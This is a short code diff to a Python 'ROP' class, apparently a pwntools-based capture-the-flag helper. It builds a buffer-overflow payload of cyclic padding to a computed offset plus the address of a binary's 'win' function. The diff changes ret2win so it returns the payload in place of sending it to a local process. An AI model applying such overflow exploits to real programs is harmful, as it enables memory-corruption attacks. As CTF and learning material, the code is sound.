@@ -8,14 +8,12 @@ class ROP:
         self.properties = properties
         self.offset = Get2overflow(filename).buf()
         self.e = ELF(filename)
-        self.p = process(filename)
         self.gadgets = []
 
     def ret2win(self):
         payload = cyclic(self.offset)
         payload += p64(self.e.sym["win"])
-        self.p.sendline(payload)
-        self.p.interactive()
+        return payload
 
     def ret2execve(self):
         pass
